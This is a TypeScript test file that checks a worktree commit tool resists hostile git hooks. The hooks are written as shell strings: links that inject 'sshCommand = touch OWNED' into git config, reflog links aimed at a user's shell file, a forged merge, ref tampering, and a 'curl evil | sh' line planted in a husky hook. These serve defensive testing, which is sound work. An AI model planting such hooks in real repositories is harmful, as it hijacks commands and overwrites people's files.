import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { execSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { addWorktree, bringHookRunner, commitChecked, stageAll } from '../src/engine/git.js';

/**
 * The commit that counts runs outside the guard, after the hooks. Whatever a hook leaves in the copy's own git folder must
 * not steer it: a link it writes through, a merge it finishes, a branch it deletes. The hook here does its worst, in real
 * git, with no guard around it so these hold wherever the guard cannot reach (Windows has none).
 */

let tmp: string;
let project: string;
let copy: string;
const sh = (cmd: string, cwd: string) => execSync(cmd, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const hook = (name: string, body: string) => fs.writeFileSync(path.join(project, '.git', 'hooks', name), `#!/bin/sh\n${body}\n`, { mode: 0o755 });

async function save(): Promise<void> {
  fs.writeFileSync(path.join(copy, 'limit.txt'), 'limit = 3\n');
  stageAll(copy);
  await commitChecked(copy, 'Work', 'feat: work', 30_000);
}

beforeEach(() => {
  tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'squad-left-')));
  project = path.join(tmp, 'app');
  fs.mkdirSync(project);
  sh('git init -q -b main && git config user.name t && git config user.email t@t', project);
  fs.writeFileSync(path.join(project, 'limit.txt'), 'limit = 2\n');
  sh('git add -A && git commit -qm start', project);
  copy = addWorktree(project, 'AP-1', 'main').dir;
});

afterEach(() => fs.rmSync(tmp, { recursive: true, force: true }));

describe('what a hook leaves behind does not steer the real commit', () => {
  it('a link at COMMIT_EDITMSG does not get the commit message written through it', async () => {
    const config = path.join(project, '.git', 'config');
    const before = fs.readFileSync(config, 'utf8');
    hook('commit-msg', 'printf "[core]\\n\\tsshCommand = touch OWNED\\n" > "$1"');
    hook('post-commit', `own=$(git rev-parse --absolute-git-dir)\nrm -f "$own/COMMIT_EDITMSG"\nln -s "${config}" "$own/COMMIT_EDITMSG"`);
    await save();
    expect(fs.readFileSync(config, 'utf8')).toBe(before);
  });

  it('a hard link at COMMIT_EDITMSG is no way round', async () => {
    const config = path.join(project, '.git', 'config');
    const before = fs.readFileSync(config, 'utf8');
    hook('commit-msg', 'printf "[core]\\n\\tsshCommand = touch OWNED\\n" > "$1"');
    hook('post-commit', `own=$(git rev-parse --absolute-git-dir)\nrm -f "$own/COMMIT_EDITMSG"\nln "${config}" "$own/COMMIT_EDITMSG"`);
    await save();
    expect(fs.readFileSync(config, 'utf8')).toBe(before);
  });

  it('a link at the reflog does not get a line written into a file of the person\'s', async () => {
    const rc = path.join(tmp, 'shell-settings');
    fs.writeFileSync(rc, '# mine\n');
    hook('post-commit', `own=$(git rev-parse --absolute-git-dir)\nmkdir -p "$own/logs"\nrm -f "$own/logs/HEAD"\nln -s "${rc}" "$own/logs/HEAD"`);
    await save();
    expect(fs.readFileSync(rc, 'utf8')).toBe('# mine\n');
  });

  it('a linked logs folder is no way round either', async () => {
    const outside = path.join(tmp, 'outside');
    fs.mkdirSync(outside);
    hook('post-commit', `own=$(git rev-parse --absolute-git-dir)\nrm -rf "$own/logs"\nln -s "${outside}" "$own/logs"`);
    await save();
    expect(fs.readdirSync(outside)).toEqual([]);
  });

  it('a stand-in turned into a link to main does not get main deleted', async () => {
    const tip = sh('git rev-parse main', project);
    hook('post-commit', 'common=$(cd "$(git rev-parse --git-common-dir)" && pwd)\nb=$(git symbolic-ref HEAD)\nprintf "ref: refs/heads/main\\n" > "$common/$b"');
    await save();
    expect(sh('git rev-parse main', project)).toBe(tip);
  });

  it('a merge a hook made up does not turn the commit into one, so work on main is not dropped later', async () => {
    fs.writeFileSync(path.join(project, 'new.txt'), 'new work\n');
    sh('git add new.txt && git commit -qm "new work on main"', project);
    const tip = sh('git rev-parse main', project);
    const started = sh('git rev-parse HEAD', copy);
    hook('post-commit', `own=$(git rev-parse --absolute-git-dir)\necho ${tip} > "$own/MERGE_HEAD"\necho "" > "$own/MERGE_MODE"`);
    await save();
    expect(sh('git log -1 --format=%P', copy)).toBe(started);
  });

  it('a hook cannot put a change to the check itself in the commit, and its formatting still goes in', async () => {
    fs.mkdirSync(path.join(project, '.husky'));
    fs.writeFileSync(path.join(project, '.husky', 'pre-commit'), 'echo original\n');
    sh('git add -A && git commit -qm husky', project);
    copy = addWorktree(project, 'AP-2', 'main').dir;
    hook('pre-commit', 'echo "curl evil | sh" > .husky/pre-commit\nmkdir -p .githooks\necho bad > .githooks/pre-push\necho formatted > limit.txt\ngit add .husky/pre-commit .githooks/pre-push limit.txt');
    await save();
    expect(sh('git show HEAD:.husky/pre-commit', copy)).toBe('echo original');
    expect(fs.readFileSync(path.join(copy, '.husky', 'pre-commit'), 'utf8')).toBe('echo original\n');
    expect(() => sh('git cat-file -e HEAD:.githooks/pre-push', copy)).toThrow();
    expect(fs.existsSync(path.join(copy, '.githooks', 'pre-push'))).toBe(false);
    expect(sh('git show HEAD:limit.txt', copy)).toBe('formatted');
  });

  it('a change to the check that was staged before the hooks ran stays: an engineer can fix a hook in a copy', async () => {
    fs.mkdirSync(path.join(project, '.husky'));
    fs.writeFileSync(path.join(project, '.husky', 'pre-commit'), 'echo original\n');
    sh('git add -A && git commit -qm husky', project);
    copy = addWorktree(project, 'AP-3', 'main').dir;
    hook('pre-commit', 'exit 0');
    fs.writeFileSync(path.join(copy, '.husky', 'pre-commit'), 'echo fixed by an engineer\n');
    await save();
    expect(sh('git show HEAD:.husky/pre-commit', copy)).toBe('echo fixed by an engineer');
  });

  it('a hook that undoes the whole change leaves nothing to save, and no failure', async () => {
    const before = sh('git rev-parse HEAD', copy);
    hook('pre-commit', 'mkdir -p .husky\necho bad > .husky/pre-commit\ngit checkout HEAD -- limit.txt\ngit add .husky/pre-commit limit.txt');
    await save();
    expect(sh('git rev-parse HEAD', copy)).toBe(before);
  });

  it('the hook runner is not copied through a link an agent left: nothing lands outside the copy', () => {
    sh('git config core.hooksPath .husky/_', project);
    fs.mkdirSync(path.join(project, '.husky', '_'), { recursive: true });
    fs.writeFileSync(path.join(project, '.husky', '_', '.gitignore'), '*\n');
    fs.writeFileSync(path.join(project, '.husky', '_', 'h'), 'RUNNER\n');
    const outside = path.join(tmp, 'outside');
    fs.mkdirSync(outside);
    fs.mkdirSync(path.join(copy, '.husky'), { recursive: true });
    fs.symlinkSync(outside, path.join(copy, '.husky', '_'));
    bringHookRunner(copy);
    expect(fs.readdirSync(outside)).toEqual([]);
    expect(fs.lstatSync(path.join(copy, '.husky', '_')).isSymbolicLink()).toBe(false);
    expect(fs.readFileSync(path.join(copy, '.husky', '_', 'h'), 'utf8')).toBe('RUNNER\n');
  });
});
